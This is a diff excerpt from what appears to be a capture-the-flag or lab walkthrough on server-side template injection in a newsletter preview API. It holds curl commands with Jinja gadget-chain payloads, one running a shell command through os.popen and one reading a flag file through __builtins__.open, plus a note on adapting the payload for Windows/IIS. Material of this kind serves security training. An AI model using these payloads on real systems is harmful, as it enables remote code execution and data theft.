@@ -748,6 +748,16 @@ curl -sG $BASE/api/newsletter/preview --data-urlencode \
   "template={{ cycler.__init__.__globals__.os.popen('cat flagstore/ssti.flag').read() }}"
 ```
 
+**On a Windows/IIS deployment** the `os.popen('cat ...')` form fails twice over:
+`cat` does not exist, and a backslash path is consumed by Jinja's own string
+parsing before Python ever sees it. Read the file directly instead — `open()`
+takes forward slashes on both platforms:
+
+```bash
+curl -sG $BASE/api/newsletter/preview --data-urlencode \
+  "template={{ cycler.__init__.__globals__.__builtins__.open('flagstore/ssti.flag').read() }}"
+```
+
 Alternative gadget chain if `cycler` is unavailable in your build:
 
 ```bash
